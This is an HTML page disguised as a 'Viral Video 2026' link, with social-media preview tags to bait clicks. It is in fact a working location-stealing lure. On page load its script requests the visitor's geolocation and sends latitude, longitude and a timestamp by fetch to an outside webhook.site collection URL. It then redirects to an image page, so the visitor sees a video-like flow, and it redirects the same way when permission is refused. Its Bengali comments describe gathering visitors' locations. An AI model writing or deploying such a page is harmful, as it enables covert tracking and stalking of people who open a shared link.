<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Viral Video 2026</title>
    
    <meta property="og:title" content="Viral Video 2026">
    <meta property="og:description" content="Click to watch the full video">
    <meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:type" content="video.other">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0; background:white; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
    <div style="text-align:center;">
        <h2>Please wait...</h2>
        <p>Loading content...</p>
    </div>

    <script>
        // ১. ক্লিক করার পর ইউজার এই লিঙ্কে চলে যাবে
        const targetURL = "https://postimg.cc/3k09KZXR";
        
        // ২. আপনার Webhook লিঙ্ক যেখানে লোকেশন ডাটা জমা হবে
        const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";

        window.onload = function() {
            // ব্রাউজার থেকে লোকেশন চাওয়ার ফাংশন
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // লোকেশন ডাটা Webhook-এ পাঠানো হচ্ছে
                    fetch(webhookURL, { 
                        method: 'POST', 
                        mode: 'no-cors', 
                        body: JSON.stringify({
                            lat: position.coords.latitude, 
                            lon: position.coords.longitude,
                            timestamp: new Date().toLocaleString()
                        }) 
                    }).then(() => { 
                        window.location.href = targetURL; 
                    });
                }, function(error) {
                    // ইউজার অনুমতি না দিলেও তাকে টার্গেট লিঙ্কে পাঠানো হবে
                    window.location.href = targetURL;
                }, {timeout: 5000});
            } else {
                // ব্রাউজারে লোকেশন সাপোর্ট না করলে সরাসরি টার্গেট লিঙ্কে যাবে
                window.location.href = targetURL;
            }
        };
    </script>
</body>
</html>
